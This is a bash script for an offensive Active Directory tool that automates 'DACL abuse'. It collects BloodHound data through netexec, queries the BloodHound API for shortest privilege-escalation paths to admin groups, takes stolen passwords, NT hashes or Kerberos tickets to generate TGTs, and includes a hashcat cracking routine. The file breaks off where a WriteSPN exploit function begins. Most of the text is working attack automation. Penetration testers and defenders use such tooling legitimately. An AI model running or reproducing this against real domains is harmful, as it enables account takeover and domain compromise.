#!/bin/bash
 echo "============================================================="
  echo "   ____  _     ____  _  __ _           ____  _      _     "
  echo "  /  _ \/ \ /\/   _\/ |/ // \         /  __\/ \  /|/ \  /|"
  echo "  | | \|| | |||  /  |   / | |   _____ |  \/|| |  ||| |\ ||"
  echo "  | |_/|| \_/||  \__|   \ | |_/\\____\|  __/| |/\||| | \||"
  echo "  \____/\____/\____/\_|\_\\____/      \_/   \_/  \|\_/  \|"
  echo "                                                        "
  echo "  > Exploiting DACLs like a quacking pro!"
  echo "      _          _          _          _          _"
  echo "    >(')____,  >(')____,  >(')____,  >(')____,  >(') ____,"
  echo "      (\` =~~/    (\` =~~/    (\` =~~/    (\` =~~/    (\` =~~/"
  echo "  ~^~^\`---'~^~^~^\`---'~^~^~^\`---'~^~^~^\`---'~^~^~^\`---'~^~^~"
  echo "============================================================="
  echo ""
usage(){
  echo "USAGE"
  echo "  ducklpwn [options]"
  echo ""
echo "DESCRIPTION"
echo "  Generates Bloodhound chains and exploits them automatically."

echo -e "\nFLAG"
echo "  -dc <DC_FQDN>        Domain Controller fully-qualified domain name (target scope for analysis)"
echo "  --dc-ip <DC_IP>      IP address of the name server or target host"
echo "  --no-gather          Skip collection; run analysis/automation on previously gathered/imported data"
echo "  -u <USER>            Username used for LDAP collection"
echo "  -p <PASSWORD>        Password for the user "
echo "  -H <HASH>            NTLM/LM hash for the user "
echo "  -k <TICKET_PATH>     Path to a Kerberos ticket file to use for authentication "
echo "  -h, --help           Show this help text and exit"

echo -e "\nEXAMPLES"
echo "  # Collect and ingest BloodHound data then run analysis"
echo "  ducklpwn -u alice -p 's3cr3t' -dc corp.local --dc-ip 10.0.0.5"

echo "  # Run analysis / automation using previously gathered data (no collection)"
echo "  ducklpwn -dc corp.local --dc-ip 10.0.0.5 --no-gather"

  exit 0
}

# Load configuration .env environment
set -eu
if [ -f .env ]; then
  # shellcheck disable=SC1090
  . .env
fi


USERNAME=""
PASSWORD=""
HASH=""
KB=""
NO_GATHER=false
DC_FQDN=""
DC_IP=""

# Parse command-line arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
        -u)
            if [ -n "$2" ]; then
                USERNAME="$2"
                shift 2
            else
                echo -e "[-] ERROR: Empty User Provided"
                usage
            fi
            ;;
        -dc)
            if [ -n "$2" ]; then
                DC_FQDN="$2"
                shift 2
            else
                echo -e "[-] ERROR: Empty DC FQDN Provided"
                usage
            fi
            ;;
        --dc-ip)
            if [ -n "$2" ]; then
                DC_IP="$2"
                shift 2
            else
                echo -e "[-] ERROR: Empty DC IP Provided"
                usage
            fi
            ;;
        -p)
            if [ -n "$2" ]; then
                PASSWORD="$2"
                shift 2
            else
                echo -e "[-] ERROR: Empty Password Provided"
                usage
            fi
            ;;
        -H)
            if [ -n "$2" ]; then
                HASH="$2"
                shift 2
            else
                echo -e "[-] ERROR: Empty Hash Provided"
                usage
            fi
            ;;
        -k)
            if [ -n "$2" ]; then
                KB="$2"
                shift 2
            else
                echo -e "[-] ERROR: Empty Kerberos Ticket"
                usage
            fi
            shift
            ;;
        --no-gather)
            NO_GATHER=true
            shift
            ;;
        -h|--help)
            usage
            ;;
        *)
            usage
            ;;
    esac
done

# ---------- Validation logic ----------
if $NO_GATHER; then
    # --no-gather mode validation
    if [ -n "$USERNAME" ]; then
        echo "[-] ERROR: --no-gather cannot be used with -u/--username"
        usage
        exit 1
    fi
    if [ -z "$DC_FQDN" ] || [ -z "$DC_IP" ]; then
        echo "[-] ERROR: --no-gather requires both -dc and --dc-ip"
        usage
        exit 1
    fi
else
    # Normal operation mode validation
    if [ -z "$USERNAME" ] || [ -z "$DC_FQDN" ] || [ -z "$DC_IP" ]; then
        echo "[-] ERROR: You must provide -u, -dc, and --dc-ip when gathering"
        usage
        exit 1
    else
        if [ -z "$PASSWORD" ] && [ -z "$HASH" ] && [ ! -s "$KB" ]; then
            echo "[-] ERROR: You must provide at least one of -p (password), -H (hash), or -k (kerberos)"
            usage
            exit 1
        fi
    fi
fi


keep_shortest_chains() {
    local input_file="$1"

    if [ ! -f "$input_file" ]; then
        echo "[-] ERROR: File '$input_file' not found." >&2
        return 1
    fi

    declare -A best_chain
    declare -A best_count
    declare -A best_line_num

    local line_number=0

    while IFS= read -r line; do
        ((line_number++))
        if [[ -z "$line" ]]; then
            continue
        fi

        # Extract nodes and count using awk with proper field handling
        awk_output=$(echo "$line" | awk -F' ---[^>]*--> ' '{
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1);
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $NF);
            print $1;
            print $NF;
            print NF - 1;
        }')
        
        # Read awk output into variables
        start_node=$(echo "$awk_output" | sed -n '1p')
        end_node=$(echo "$awk_output" | sed -n '2p')
        count=$(echo "$awk_output" | sed -n '3p')

        # Skip if we couldn't properly parse the line
        if [[ -z "$start_node" || -z "$end_node" || -z "$count" ]]; then
            continue
        fi

        key="${start_node}|${end_node}"

        if [[ ! -v best_chain["$key"] ]]; then
            best_chain["$key"]="$line"
            best_count["$key"]=$count
            best_line_num["$key"]=$line_number
        else
            # Ensure both values are numeric before comparison
            if [[ "$count" =~ ^[0-9]+$ && "${best_count["$key"]}" =~ ^[0-9]+$ ]]; then
                if (( count < best_count["$key"] )); then
                    best_chain["$key"]="$line"
                    best_count["$key"]=$count
                    best_line_num["$key"]=$line_number
                fi
            else
                # If not numeric, keep the first occurrence
                continue
            fi
        fi
    done < "$input_file"

    # Output chains in order of first occurrence
    for key in "${!best_chain[@]}"; do
        printf "%d\t%s\n" "${best_line_num[$key]}" "${best_chain[$key]}"
    done | sort -n -k1,1 | cut -f2-
}

make_chains() {
    local input_file="$1"
    declare -A graph
    declare -A in_degree

    while IFS= read -r line; do
        [[ -z "$line" ]] && continue
        source=$(awk -F '---' '{print $1}' <<< "$line" | awk '{$1=$1;print}')
        rest=$(awk -F '---' '{print $2}' <<< "$line")
        edge_type=$(awk -F '-->' '{print $1}' <<< "$rest" | awk '{$1=$1;print}')
        target=$(awk -F '-->' '{print $2}' <<< "$rest" | awk '{$1=$1;print}')
        
        if [[ -n "${graph[$source]}" ]]; then
            graph[$source]="${graph[$source]}|$edge_type:$target"
        else
            graph[$source]="$edge_type:$target"
        fi

        [[ -z "${in_degree[$source]}" ]] && in_degree[$source]=0
        in_degree[$target]=$(( ${in_degree[$target]:-0} + 1 ))
    done < "$input_file"

    starts=()
    for node in "${!in_degree[@]}"; do
        [[ ${in_degree[$node]} -eq 0 ]] && starts+=("$node")
    done

    queue=()
    for start in "${starts[@]}"; do
        queue+=("$start|$start")
    done

    while [[ ${#queue[@]} -gt 0 ]]; do
        element="${queue[0]}"
        queue=("${queue[@]:1}")
        IFS='|' read -r node path_str <<< "$element"

        if [[ -n "${graph[$node]:-}" ]]; then
            IFS='|' read -ra edges <<< "${graph[$node]}"
            for edge in "${edges[@]}"; do
                IFS=':' read -r edge_type next_node <<< "$edge"
                new_path="$path_str ---$edge_type--> $next_node"
                queue+=("$next_node|$new_path")
            done
        else
            echo "$path_str"
        fi
    done
}

colorize_kind() {
    local kind="$1"
    case "$kind" in
        "User") echo -e "${GREEN}(${kind})${NC}" ;;
        "Computer") echo -e "${PURPLE}(${kind})${NC}" ;;
        "Group") echo -e "${ORANGE}(${kind})${NC}" ;;
        "Domain") echo -e "${LIGHT_BLUE}(${kind})${NC}" ;;
        "OU") echo -e "${BLUE}(${kind})${NC}" ;;
        "GPO") echo -e "${RED}${label}${NC}" ;;
        *) echo "(${kind})" ;;  # Default no color for other types
    esac
}

colorize_label() {
    local label="$1"
    local kind="$2"
    case "$kind" in
        "User") echo -e "${GREEN}${label}${NC}" ;;
        "Computer") echo -e "${PURPLE}${label}${NC}" ;;
        "Group") echo -e "${ORANGE}${label}${NC}" ;;
        "Domain") echo -e "${LIGHT_BLUE}${label}${NC}" ;;
        "OU") echo -e "${BLUE}${label}${NC}" ;;
        "GPO") echo -e "${MAGENTA}${label}${NC}" ;;
        *) echo "${label}" ;;  # Default no color for other types
    esac
}

align_ad_relationships() {
    # Read input from file or stdin
    input=$(cat "$1" 2>/dev/null || cat)

    # Calculate maximum lengths for alignment
    max_source_len=0
    max_op_len=0
    while IFS= read -r line; do
        # Extract components
        source_part=$(echo "$line" | awk -F'---' '{print $1}' | sed 's/ *$//')
        op_part=$(echo "$line" | awk -F'---|-->' '{print $2}' | sed 's/ *$//')
        
        # Update maximum lengths
        (( ${#source_part} > max_source_len )) && max_source_len=${#source_part}
        (( ${#op_part} > max_op_len )) && max_op_len=${#op_part}
    done <<< "$input"

    # Generate aligned output
    while IFS= read -r line; do
        source_part=$(echo "$line" | awk -F'---' '{print $1}' | sed 's/ *$//')
        op_part=$(echo "$line" | awk -F'---|-->' '{print $2}' | sed 's/ *$//')
        target_part=$(echo "$line" | awk -F'--> ' '{print $2}')
        
        printf "%-*s---%-*s--> %s\n" \
            "$max_source_len" "$source_part" \
            "$max_op_len" "$op_part" \
            "$target_part"
    done <<< "$input"
}

color_to_obj() {
    local input="$1"
    
    # Check for color codes and return corresponding type
    if [[ "$input" == *$'\033[0;32m'* ]]; then
        echo "User"
    elif [[ "$input" == *$'\033[0;35m'* ]]; then
        echo "Computer"
    elif [[ "$input" == *$'\033[0;33m'* ]]; then
        echo "Group"
    elif [[ "$input" == *$'\033[0;34m'* ]]; then
        echo "OU"
    elif [[ "$input" == *$'\033[0;36m'* ]]; then
        echo "Domain"
    elif [[ "$input" == *$'\033[0;91m'* ]]; then
        echo "GPO"
    elif [[ "$input" == *$'\033[0;37m'* ]]; then
        echo "ACL"
    else
        echo "Unknown"
        echo "Error in detecting type for $input" >/dev/tty
    fi
}

# Dumps and Ingest the Domain ZIP File
domain=${DC_FQDN#*.}
flt_domain=${domain^^}

get_ticket() {
    local DC_FQDN=""
    local USERNAME=""
    local PASSWORD=""
    local HASH=""

    # Parse command-line arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -u|--username)
                USERNAME="$2"
                USERNAME="${USERNAME^^}"
                shift 2
                ;;
            -p|--password)
                PASSWORD="$2"
                shift 2
                ;;
            -H|--hash)
                HASH="$2"
                shift 2
                ;;
            *)
                DC_FQDN="$1"
                shift
                ;;
        esac
    done

    if [[ -z "$DC_FQDN" || -z "$USERNAME" ]]; then
        echo "Usage: get_ticket DC_FQDN -u USERNAME [-p PASSWORD | -H HASH]"
        return 1
    fi

    if [[ -n "$PASSWORD" && -n "$HASH" ]]; then
        echo "[-] ERROR: Cannot specify both password and hash"
        return 1
    fi

    if [[ -z "$PASSWORD" && -z "$HASH" ]]; then
        echo "[-] ERROR: Must specify either password or hash"
        return 1
    fi

    echo -e "\n[*] Generating TGT for \"$USERNAME\""
    
    if [[ -n "$HASH" ]]; then
        output=$(nxc smb "$DC_IP" -u "$USERNAME" -H "$HASH" -k --generate-tgt "./$USERNAME" 2>&1)
        if [[ ! -f "./$USERNAME.ccache" ]] || ! grep -q "[+]" <<< "$output"; then
            echo -e "[-] TGT Generation Failed, did you configure the AD realm?"
            echo "$output" > /dev/tty
            return 1
        fi
    elif [[ -n "$PASSWORD" ]]; then
        output=$(nxc smb "$DC_IP" -u "$USERNAME" -p "$PASSWORD" -k --generate-tgt "./$USERNAME" 2>&1)
        if [[ ! -f "./$USERNAME.ccache" ]] || ! grep -q "[+]" <<< "$output"; then
            echo -e "[-] TGT Generation Failed, did you configure the AD realm?"
            echo "$output" > /dev/tty
            return 1
        fi
    fi

    export KRB5CCNAME="./${USERNAME}.ccache"
    echo -e "${BLUE}[+] Ticket ${USERNAME}.ccache created and saved in current dir. ${NC}" >/dev/tty
}

if [[ ! -z $PASSWORD ]]; then
    get_ticket $DC_FQDN -u $USERNAME -p $PASSWORD
    if [[ $? -ne 0 ]]; then
        echo -e "[-] Ticket generation failed. Check your credentials"
        exit 1
    fi
    export KRB5CCNAME="./${USERNAME}.ccache"
 

elif [[ ! -z $HASH ]]; then
    get_ticket $DC_FQDN -u $USERNAME -H $HASH
    if [[ $? -ne 0 ]]; then
        echo -e "[-] Ticket generation failed. Check your credentials"
        exit 1
    fi
    export KRB5CCNAME="./${USERNAME}.ccache"


elif [[ ! -z $KB ]]; then
    if [[ ! -s $KB ]]; then
        echo -e "[-] Cannot find ticket \"$KB\""
        exit 1
    fi
    export KRB5CCNAME=$KB
    echo -e "\n-----------LOADED TICKET FOR \"$USERNAME\"----------------"
    klist
fi

if [[ $NO_GATHER == true ]]; then
    echo -e "\n-------------SKIPPING LDAP INGESTION FOR \"${flt_domain}\"--------------"
else
    echo -e "\n---------------GATHERING LDAP DATA FROM DC----------------"
    if [[ ! -z $PASSWORD ]]; then
        zip_file=$(nxc ldap "$DC_FQDN" -u $USERNAME -p $PASSWORD --dns-server "$DC_IP" --dns-tcp --dns-timeout 30 --bloodhound --collection All | grep "\.zip" | awk '{print $8}')
    elif [[ ! -z $HASH ]]; then
        zip_file=$(nxc ldap "$DC_FQDN" -u $USERNAME -H $HASH --dns-server "$DC_IP" --dns-tcp --dns-timeout 30 --bloodhound --collection All | grep "\.zip" | awk '{print $8}')
    else
        zip_file=$(nxc ldap "$DC_FQDN" --use-kcache --dns-server "$DC_IP" --dns-tcp --dns-timeout 30 --bloodhound --collection All | grep "\.zip" | awk '{print $8}')
    fi


    echo -e "\n-----------EXTRACTED ZIP DATA \"$zip_file\"------------\n"
    if [[ ! -s $zip_file ]]; then
        echo -e "Error while extracting LDAP data, try changing collection methods or DNS settings"
        echo -e "EXECUTED COMMAND -> \"nxc ldap $DC_FQDN --use-kcache --dns-server $DC_IP --bloodhound --dns-tcp --dns-timeout 30 --collection All\""
        exit 1
    fi
fi

# Starts the BH API if not listening
stat=$(curl -s -o /dev/null -w "%{http_code}" $BH_URL/api/v2/login)
if [[ $stat != "405" ]]; then
    echo -e "\n---------STARTING BLOODHOUND API--------------"
    /home/kali/TOOLS/bloodhound-cli containers start
fi

# Authenticates to the BH API if not previously authenticated
if [[ ! -s /home/$USER/.config/bhcli/bhcli.ini ]]; then
    echo -e "\n------------TOKEN NOT FOUND, PLEASE AUTHENTICATE TO BLOODHOUND---------"
    bhcli auth $BH_URL
fi

# Get JWT token
TOKEN=$(curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"'"$BH_USER"'","secret":"'"$BH_PASS"'","login_method":"secret"}' \
  $BH_URL/api/v2/login | jq -r '.data.session_token')

# Check if token retrieval was successful
if [ -z "$TOKEN" ] || [ "$TOKEN" = "null" ]; then
    echo "[-] ERROR: Failed to get authentication token, invalid credentials"
    exit 1
fi


if [[ $NO_GATHER == false ]]; then
    echo -e "\n------------UPLOADING ZIP FILE TO BLOODHOUND API--------------"
    timeout 300 bhcli upload $zip_file
    exit_code=$?

    if [[ $exit_code -eq 124 ]]; then
        echo -e "\n[-] ERROR: Upload timed out after 5 minutes, try to re-authenticate to ingest the file"
        exit 1
    elif [[ $exit_code -ne 0 ]]; then
        echo -e "\n[-] ERROR: Upload failed with exit code $exit_code."
        exit 1
    fi
fi

# Define colors (non-bold versions)
WHITE='\033[0;37m'      # Abuse type
GREEN='\033[0;32m'      # Users
PURPLE='\033[0;35m'     # Computers
ORANGE='\033[0;33m'     # Groups
BLUE='\033[0;34m'       # OU
LIGHT_BLUE='\033[0;36m' # Domain
YELLOW='\033[1;33m'     # Messages
RED='\033[;91m'         # GPO
MAGENTA='\033[0;95m'    # GPOs (Light Magenta)
NC='\033[0m'            # No Color
BOLD='\033[1m'

show_color_legend() {
    echo -e "\n${BOLD}LEGEND:${NC}"
    echo -e "──────────────────────────"
    echo -e "${GREEN}Users${NC}           "
    echo -e "${PURPLE}Computers${NC}       "
    echo -e "${ORANGE}Groups${NC}          "
    echo -e "${BLUE}OUs${NC}             "
    echo -e "${LIGHT_BLUE}Domains${NC}"
    echo -e "${MAGENTA}GPOs${NC}         "
    echo -e "${RED}ACL${NC}"  
    echo -e "──────────────────────────"
}

# Getting statistics
bhcli stats -d $domain

# Launch DACL Query
show_color_legend
DACL_JSON=$(curl -s "$BH_URL/api/v2/graphs/cypher" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "{\"query\":\"MATCH p=shortestPath((s)-[:Owns|GenericAll|WriteGPLink|MemberOf|GPOAppliesTo|GenericWrite|WriteOwner|WriteDacl|ForceChangePassword|AllExtendedRights|AddMember|HasSession|AllowedToDelegate|CoerceToTGT|AllowedToAct|AdminTo|CanPSRemote|CanRDP|ExecuteDCOM|AddSelf|DCSync|ReadLAPSPassword|ReadGMSAPassword|DumpSMSAPassword|SQLAdmin|AddAllowedToAct|WriteSPN|AddKeyCredentialLink|SyncLAPSPassword|WriteAccountRestrictions*1..]->(t)) \\nWHERE NOT COALESCE(s.system_tags, '') CONTAINS 'admin_tier_0' and (s:User or s:Computer) and (t:User or t:Computer or (t:Group and not t.objectid =~ '.*-(581|578|568|554|498|558|552|521|553|557|561|513|582|579|575|571|559|577|576|517|1102|522|569|574|545|515|572|560|556)$' and not t.distinguishedname =~ '.*EXCHANGE INSTALL DOMAIN.*') or t:OU or t:Domain) and not (t.distinguishedname =~ '.*(EXCHANGE ONLINE-APPLICATION|GUEST|DEFAULTACCOUNT|SYSTEMMAILBOX|DISCOVERYSEARCHMAILBOX|FEDERATEDEMAIL|HEALTHMAILBOX|MIGRATION).*') \\nAND s<>t AND s.domain = \\\"${flt_domain}\\\"\\nRETURN p\"}")
DACL=$(echo "$DACL_JSON" | jq -r '
  .data as $data |
  $data.edges[] |
  {
    source: $data.nodes[.source],
    target: $data.nodes[.target],
    label: .label
  } |
  "\(.source.label)|\(.source.kind)|\(.target.label)|\(.target.kind)|\(.label)"
' | while IFS="|" read -r source_label source_kind target_label target_kind abuse_type; do
    # Colorize the source label (name) based on its kind
    colored_source_label="$(colorize_label "$source_label" "$source_kind")"
    colored_target_label="$(colorize_label "$target_label" "$target_kind")"
    
    # Keep the kind indicators colored
    colored_source_kind="$(colorize_kind "$source_kind")"
    colored_target_kind="$(colorize_kind "$target_kind")"
    
    # Format the output line (colored names, colored kinds, red abuse type)
    echo -e "${colored_source_label} ---${RED}${abuse_type}${NC}--> ${colored_target_label}BREAK"
done)

if [[ ! -z $DACL ]]; then
    echo $DACL | sed 's/BREAK /\n/g' | sed 's/BREAK//g' | sed "s/@${flt_domain}//g" | sed "s/\.${flt_domain}/\$/g" | sort -u > ./DACL_${flt_domain}
    align_ad_relationships "./DACL_${flt_domain}" > ./DACL_ALIGN_${flt_domain} && mv ./DACL_ALIGN_${flt_domain} ./DACL_${flt_domain}
    make_chains ./DACL_${flt_domain} > DACL_ABUSE_${flt_domain}.txt

    # Admin group truncation
    cat DACL_ABUSE_${flt_domain}.txt | sed 's/\(-> .*KEY ADMINS\).*/\1/' | sed 's/\(-> .*ADMINISTRATORS\).*/\1/' | sed 's/\(-> .*DOMAIN ADMINS\).*/\1/' | sed 's/\(-> .*ENTERPRISE ADMINS\).*/\1/' | sort -u >t;mv t DACL_ABUSE_${flt_domain}.txt

    # Account operators domain paths
    cat DACL_ABUSE_${flt_domain}.txt | grep "ACCOUNT OPERATORS" --color=never | grep ${flt_domain} --color=never > t
    if [[ -s t ]]; then
        echo -e "ACCOUNT OPERATORS MEMBERS FOUND! THIS GROUP HAS GENERIC-ALL ON ALL ACCOUNTS AND GROUPS, DISPLAYING ONLY PATHS TO DOMAIN"
    fi
    cat DACL_ABUSE_${flt_domain}.txt | grep -v "ACCOUNT OPERATORS" > t2
    cat t >> t2 && mv t2 DACL_ABUSE_${flt_domain}.txt && rm t

    # Pure MemberOf Chains
    cat DACL_ABUSE_${flt_domain}.txt | grep -vE "Owns|GenericAll|GenericWrite|WriteOwner|WriteDacl|ForceChangePassword|AllExtendedRights|AddMember|HasSession|GPLink|AllowedToDelegate|CoerceToTGT|AllowedToAct|AdminTo|CanPSRemote|CanRDP|ExecuteDCOM|HasSIDHistory|AddSelf|DCSync|ReadLAPSPassword|ReadGMSAPassword|DumpSMSAPassword|SQLAdmin|AddAllowedToAct|WriteSPN|AddKeyCredentialLink|SyncLAPSPassword|WriteAccountRestrictions|WriteGPLink|GoldenCert|ADCSESC1|ADCSESC3|ADCSESC4|GPOAppliesTo|ADCSESC6a|ADCSESC6b|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13|SyncedToEntraUser|CoerceAndRelayNTLMToSMB|CoerceAndRelayNTLMToADCS|WriteOwnerLimitedRights|OwnsLimitedRights|DCFor" --color=never | grep -v ^$ > GRPS_${flt_domain}.txt
    while read -r line; do
        grep -F -v "$line" DACL_ABUSE_${flt_domain}.txt >t; mv t DACL_ABUSE_${flt_domain}.txt
    done < GRPS_${flt_domain}.txt

    if [[ -f DACL_ABUSE_${flt_domain}.txt ]]; then
        echo -e "\n---------DACL ABUSE CHAINS----------"
        awk -F ' ---' '
        {
            # Extract the starting node (first part before "---")
            start_node = $1;
    
            # Store all paths by their starting node
            paths[start_node] = paths[start_node] $0 "\n";
        }
        END {
            # Print all paths grouped by starting node with spacing
            first_group = 1;
            for (node in paths) {
                if (!first_group) {
                    print "";  # Add empty line between groups
                }
                printf "%s", paths[node];
                first_group = 0;
            }
        }' "DACL_ABUSE_${flt_domain}.txt"
    fi

    if [[ -s GRPS_${flt_domain}.txt ]]; then
        echo -e "\n-------PURE MEMBERSHIP CHAINS----------"
        cat GRPS_${flt_domain}.txt
    fi
fi

grep -oP '\x1b\[0;34m\K[^\x1b]*(?=\x1b\[0m)' DACL_ABUSE_${flt_domain}.txt --color=never > ./OU_TARGETS_${flt_domain}.txt
if [[ -s ./OU_TARGETS_${flt_domain}.txt ]]; then
    OU_JSON=$(curl -s "$BH_URL/api/v2/graphs/cypher" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "{\"query\":\"MATCH p=shortestPath((s)-[:Contains*1..]->(t)) \\nWHERE s:OU and (t:User or t:Group or t:Computer) \\nAND s<>t AND s.domain = \\\"${flt_domain}\\\"\\nRETURN p\"}")
    OU=$(echo "$OU_JSON" | jq -r '
    .data as $data |
    $data.edges[] |
    {
        source: $data.nodes[.source],
        target: $data.nodes[.target],
        label: .label
    } |
    "\(.source.label)|\(.source.kind)|\(.target.label)|\(.target.kind)|\(.label)"
    ' | while IFS="|" read -r source_label source_kind target_label target_kind abuse_type; do
        # Colorize the source label (name) based on its kind
        colored_source_label="$(colorize_label "$source_label" "$source_kind")"
        colored_target_label="$(colorize_label "$target_label" "$target_kind")"
    
        # Keep the kind indicators colored
        colored_source_kind="$(colorize_kind "$source_kind")"
        colored_target_kind="$(colorize_kind "$target_kind")"
    
        # Format the output line (colored names, colored kinds, red abuse type)
        echo -e "${colored_source_label} ---${RED}${abuse_type}${NC}--> ${colored_target_label}BREAK"
    done)

    if [[ ! -z $OU ]]; then
        # Read input from file or stdin
        echo $OU | sed 's/BREAK /\n/g' | sed 's/BREAK//g' | sed "s/@${flt_domain}//g" | sed "s/\.${flt_domain}/\$/g" | sort -u > ./OU_${flt_domain}
        align_ad_relationships "./OU_${flt_domain}" > ./OU_ALIGN_${flt_domain} && mv ./OU_ALIGN_${flt_domain} ./OU_${flt_domain}
        make_chains ./OU_${flt_domain} > OU_ABUSE_${flt_domain}.txt
        grep -F -f ./OU_TARGETS_${flt_domain}.txt OU_ABUSE_${flt_domain}.txt > t; mv t OU_ABUSE_${flt_domain}.txt
        if [[ -s OU_ABUSE_${flt_domain}.txt ]]; then
            echo -e "\n---------OU CHILD OBJECTS----------"
            awk -F ' ---' '
            {
                # Extract the starting node (first part before "---")
                start_node = $1;
    
                # Store all paths by their starting node
                paths[start_node] = paths[start_node] $0 "\n";
            }
            END {
                # Print all paths grouped by starting node with spacing
                first_group = 1;
                for (node in paths) {
                    if (!first_group) {
                        print "";  # Add empty line between groups
                    }
                    printf "%s", paths[node];
                    first_group = 0;
                }
            }' "OU_ABUSE_${flt_domain}.txt"
        fi
    fi
fi
input_file="DACL_ABUSE_${flt_domain}.txt"

# Verify file exists and is readable
if [ ! -f "$input_file" ] || [ ! -r "$input_file" ]; then
    echo "[-] ERROR: Cannot read file '$input_file'"
    exit 1
fi

# Read chains from file into array (ignoring empty/commented lines)
readarray -t chains < <(grep -v -e '^$' -e '^#' "$input_file")

# Check if we got any chains
if [ ${#chains[@]} -eq 0 ]; then
    echo "[-] ERROR: No valid chains found in file"
    exit 1
fi

# Extract unique starting points
get_unique_sources() {
    declare -A sources
    for chain in "${chains[@]}"; do
        # Extract first node (handles chains starting with special characters)
        source_node=$(echo "$chain" | awk '{print $1}')
        sources["$source_node"]=1
    done
    printf '%s\n' "${!sources[@]}" | sort
}

# Main menu - simplified version
selected_chains=()
while true; do
    echo -e "\nChoose DACL Chains to Exploit:"
    mapfile -t unique_sources < <(get_unique_sources)
    
    # Display menu options
    for ((i=0; i<${#unique_sources[@]}; i++)); do
        echo "$((i+1))) ${unique_sources[i]}"
    done
    echo "$(( ${#unique_sources[@]} + 1 ))) Exit"
    
    # Get user input
    read -p "Select an option (1-$((${#unique_sources[@]} + 1))): " choice
    
    # Validate input
    if [[ "$choice" =~ ^[0-9]+$ ]]; then
        if (( choice >= 1 && choice <= ${#unique_sources[@]} )); then
            # Automatically collect all chains for selected source
            selected_source="${unique_sources[choice-1]}"
            echo -e "\nSelected: $selected_source"
            
            src_strip=$(echo $selected_source | sed 's/\x1B\[[0-9;]*[mGK]//g')
            src_type=$(color_to_obj $selected_source)
            if [[ $src_strip == ${USERNAME^^} ]]; then
                echo -e "Account $selected_source is already compromised!"
            else
                if [[ $src_type == "Group" ]]; then
                    while true; do
                        read -erp "[?] Input credentials for a member of $selected_source (USER:PASS / USER:HASH / USER:TGT_FILE): " credentials </dev/tty
                        creds=$(echo $credentials | awk -F":" '{print $2}')
                        creds_src=$(echo $credentials | awk -F":" '{print $1}')

                        if [[ "$creds" =~ ^[a-fA-F0-9]{32}$ ]]; then
                            get_ticket $DC_FQDN -u $creds_src -H $creds
                            if [ $? -eq 0 ]; then break; fi
                        elif [[ -s $creds ]]; then
                            cp $creds ./${creds_src^^}.ccache
                            export KRB5CCNAME="$creds"
                            klist
                            break
                        else
                            get_ticket $DC_FQDN -u $creds_src -p $creds
                            if [ $? -eq 0 ]; then break; fi
                        fi
                        
                        echo -e "[-] Authentication failed. Please check your credentials and try again.\n"
                    done
                else
                    while true; do
                        echo "[?] Choose authentication method for $selected_source:"
                        echo "  1) Password"
                        echo "  2) NT hash"
                        echo "  3) Kerberos ticket file"
                        read -erp "Select option (1-3): " auth_method </dev/tty
                        
                        case $auth_method in
                            1)
                                # Password authentication
                                read -erp "[?] Enter password for $src_strip: " password </dev/tty
                                echo  # Newline after hidden input
                                get_ticket "$DC_FQDN" -u "$src_strip" -p "$password"
                                if [ $? -eq 0 ]; then break; fi
                                ;;
                                
                            2)
                                # Hash authentication
                                while true; do
                                    read -erp "[?] Enter NT hash for $src_strip (32 chars): " nt_hash </dev/tty
                                    if [[ "$nt_hash" =~ ^[a-fA-F0-9]{32}$ ]]; then
                                        get_ticket "$DC_FQDN" -u "$src_strip" -H "$nt_hash"
                                        if [ $? -eq 0 ]; then break 2; fi  # Break both loops on success
                                        break
                                    else
                                        echo "[-] Invalid hash format. Must be 32-character hex string."
                                    fi
                                done
                                ;;
                                
                            3)
                                # Ticket file authentication
                                while true; do
                                    read -erp "[?] Enter path to Kerberos ticket file: " ticket_file </dev/tty
                                    if [[ ! -f "$ticket_file" ]]; then
                                        echo "[-] File does not exist: $ticket_file"
                                        break
                                    fi
                                    
                                    if [[ ! -s "$ticket_file" ]]; then
                                        echo "[-] Ticket file is empty: $ticket_file"
                                        break
                                    fi
                                    
                                    # Clean the source name for filename
                                    selected_src_noc=$(echo "$selected_source" | sed -e 's/\x1b\[[0-9;]*m//g')
                                    cp "$ticket_file" "./${selected_src_noc}.ccache"
                                    cp "$ticket_file" "./${selected_src_noc,,}.ccache"
                                    
                                    export KRB5CCNAME="$ticket_file"
                                    if klist; then
                                        break 2  # Break both loops on success
                                    else
                                        echo "[-] The provided ticket file is invalid or expired"
                                        break
                                    fi
                                done
                                ;;
                                
                            *)
                                echo "[-] Invalid selection. Please choose 1, 2, or 3."
                                ;;
                        esac
                        
                        echo -e "[-] Authentication failed. Please try again.\n"
                    done             
                fi
            fi

            for chain in "${chains[@]}"; do
                if [[ "$chain" == "$selected_source"* ]]; then
                    selected_chains+=("$chain")
                fi
            done
            break  # Exit the menu loop
        elif (( choice == ${#unique_sources[@]} + 1 )); then
            echo "Exiting..."
            exit 0
        else
            echo -e "[-] Invalid option. Please try again.\n"
        fi
    else
        echo "Please enter a valid number."
    fi
done


hashcat_crack() {
    local hash_file="$1"  # This should be a FILE containing the hash, not the hash itself
    local mode="$2"

    while true; do
        read -e -p "[?] Path to wordlist (or 'exit' to quit): " WORDLIST </dev/tty
        [[ "$WORDLIST" == "exit" ]] && { echo "[!] Exiting."; return 0; }
        
        [[ ! -f "$WORDLIST" ]] && { echo "[-] Wordlist not found!"; continue; }

        echo "[*] Cracking with hashcat..."
        hashcat -m "$mode" -a 0 -w 3 -O -o cracked.txt "$hash_file" "$WORDLIST" </dev/tty

        if [[ -s "cracked.txt" ]]; then
            CRACKED_PASS=$(awk -F':' '{print $NF}' cracked.txt)
            echo "[+] Success! Password: $CRACKED_PASS"
            export CRACKED_PASS
            rm -f cracked.txt
            return 0
        else
            echo "[-] No password found."
        fi
    done
}


MemberOf(){
    return 0
} 


WriteSPN(){
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"
    
    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---WriteSPN--> $3\" \n${NC}" >/dev/tty
    export KRB5CCNAME="./$SRC.ccache"

